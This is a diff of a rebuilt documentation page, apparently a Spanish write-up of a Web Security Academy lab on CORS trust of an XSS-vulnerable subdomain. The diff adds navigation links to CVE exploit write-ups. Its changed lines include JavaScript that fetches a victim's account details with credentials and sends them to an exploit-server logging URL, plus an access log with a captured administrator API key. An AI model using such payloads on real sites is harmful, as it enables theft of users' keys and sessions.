@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -307,6 +307,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -423,6 +427,62 @@
     
   
     CVE-2026-42980 WMI Underflow (ES)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-en/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox to SYSTEM (EN)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-es/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox a SYSTEM (ES)
   
 
     
@@ -1632,10 +1692,10 @@
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="na">Access-Control-Allow-Origin</span><span class="o">:</span> <span class="l">http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net</span>
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
 </span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>{
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>  &quot;username&quot;: &quot;wiener&quot;,
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>  &quot;email&quot;: &quot;...&quot;,
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>  &quot;apikey&quot;: &quot;...&quot;,
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>  &quot;sessions&quot;: [...]
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>  "username": "wiener",
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>  "email": "...",
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>  "apikey": "...",
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>  "sessions": [...]
 </span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>}
 </span></code></pre></div></p>
 <p>Confirmado: el servidor refleja el <code>Origin</code> y permite credenciales desde subdominios.</p>
@@ -1653,16 +1713,16 @@
 <p>Este código JavaScript roba el API key haciendo una petición con credenciales desde un origen permitido por CORS:</p>
 <div class="language-javascript highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">xhr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://exploit-SERVER_ID.exploit-server.net/log?data=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'https://exploit-SERVER_ID.exploit-server.net/log?data='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
 </span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="p">};</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;https://0ad900c9031651e180a9c14d004400f0.web-security-academy.net/accountDetails&#39;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span><span class="w"> </span><span class="s1">'https://0ad900c9031651e180a9c14d004400f0.web-security-academy.net/accountDetails'</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
 </span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
 </span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
 </span></code></pre></div>
 <h4 id="b-pagina-en-el-exploit-server">B) Página en el Exploit Server<a class="headerlink" href="#b-pagina-en-el-exploit-server" title="Permanent link">&para;</a></h4>
 <p>Esta página redirige a la víctima al subdominio vulnerable con el payload XSS inyectado:</p>
 <div class="language-html highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=&lt;script&gt;var xhr=new XMLHttpRequest();xhr.onload=function(){location=&quot;https://exploit-SERVER_ID.exploit-server.net/log?data=&quot;%2BencodeURIComponent(this.responseText);};xhr.open(&quot;GET&quot;,&quot;https://0ad900c9031651e180a9c14d004400f0.web-security-academy.net/accountDetails&quot;,true);xhr.withCredentials=true;xhr.send();&lt;\/script&gt;&amp;storeId=1&#39;</span><span class="p">;</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=&lt;script&gt;var xhr=new XMLHttpRequest();xhr.onload=function(){location="https://exploit-SERVER_ID.exploit-server.net/log?data="%2BencodeURIComponent(this.responseText);};xhr.open("GET","https://0ad900c9031651e180a9c14d004400f0.web-security-academy.net/accountDetails",true);xhr.withCredentials=true;xhr.send();&lt;\/script&gt;&amp;storeId=1'</span><span class="p">;</span>
 </span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
 <p><strong>Nota importante:</strong> El <code>&lt;\/script&gt;</code> está escapado para evitar que cierre prematuramente el script contenedor.</p>
@@ -1676,15 +1736,15 @@
 <h3 id="paso-5-recuperar-el-api-key">Paso 5: Recuperar el API key<a class="headerlink" href="#paso-5-recuperar-el-api-key" title="Permanent link">&para;</a></h3>
 <p>Ir a <strong>"Access log"</strong> en el exploit server y buscar la entrada que contenga <code>/log?data=</code>:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>10.0.3.81 2026-02-12 21:19:25 +0000 
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>&quot;GET /log?data=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%2245SgnHiFRDyJAHh7at2dHYkWmzkkzKut%22%0A%20%20%5D%0A%7D HTTP/1.1&quot; 200
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>"GET /log?data=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%2245SgnHiFRDyJAHh7at2dHYkWmzkkzKut%22%0A%20%20%5D%0A%7D HTTP/1.1" 200
 </span></code></pre></div>
 <p>Decodificando el parámetro <code>data</code>:</p>
 <div class="language-json highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">{</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;administrator&quot;</span><span class="p">,</span>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">  </span><span class="nt">&quot;apikey&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC&quot;</span><span class="p">,</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">  </span><span class="nt">&quot;sessions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">    </span><span class="s2">&quot;45SgnHiFRDyJAHh7at2dHYkWmzkkzKut&quot;</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span><span class="nt">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"administrator"</span><span class="p">,</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span><span class="nt">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">  </span><span class="nt">"apikey"</span><span class="p">:</span><span class="w"> </span><span class="s2">"h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC"</span><span class="p">,</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">  </span><span class="nt">"sessions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">    </span><span class="s2">"45SgnHiFRDyJAHh7at2dHYkWmzkkzKut"</span>
 </span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">  </span><span class="p">]</span>
 </span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="p">}</span>
 </span></code></pre></div>
@@ -1825,7 +1885,7 @@
       <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.sections", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "content.code.copy", "content.action.edit", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
